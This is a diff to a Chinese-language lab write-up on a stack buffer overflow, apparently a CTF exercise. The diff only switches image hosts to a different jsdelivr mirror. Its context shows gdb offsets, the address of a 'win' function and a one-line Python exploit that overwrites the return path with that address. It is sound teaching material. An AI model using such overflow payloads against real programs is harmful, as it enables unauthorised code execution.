@@ -118,11 +118,11 @@ void win(void)
 
 **gdb调试**
 
-**<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/1f5f13de80cd8f8bb704edd452af0728.png" alt="1f5f13de80cd8f8bb704edd452af0728.png" width="641" height="467">**
+**<img src="https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/1f5f13de80cd8f8bb704edd452af0728.png" alt="1f5f13de80cd8f8bb704edd452af0728.png" width="641" height="467">**
 
 **buffer变量的偏移地址为bp-0x50h**
 
-**<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/a2f071794bc60995a6c2a7054afd4be7.png" alt="a2f071794bc60995a6c2a7054afd4be7.png" width="626" height="414">**
+**<img src="https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/a2f071794bc60995a6c2a7054afd4be7.png" alt="a2f071794bc60995a6c2a7054afd4be7.png" width="626" height="414">**
 
 **fp变量的偏移地址为bp-0x8h**
 
@@ -130,7 +130,7 @@ void win(void)
 
 **查找win函数的地址**
 
-**<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/700f0763d6207bf66c783e32f35f4085.png" alt="700f0763d6207bf66c783e32f35f4085.png" width="589" height="84">**
+**<img src="https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/700f0763d6207bf66c783e32f35f4085.png" alt="700f0763d6207bf66c783e32f35f4085.png" width="589" height="84">**
 
 **可以看到，win函数的地址为0x004005bd，exp如下：**
 
@@ -138,4 +138,4 @@ void win(void)
 python2 -c "print 'A' * 72 + '\xbd\x05\x40\x00'" | ./a.out  //win函数地址使用小端序
 ```
 
-<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/a250c49c943f6109088ae68948963def.png" alt="a250c49c943f6109088ae68948963def.png" width="740" height="117">
+<img src="https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/a250c49c943f6109088ae68948963def.png" alt="a250c49c943f6109088ae68948963def.png" width="740" height="117">
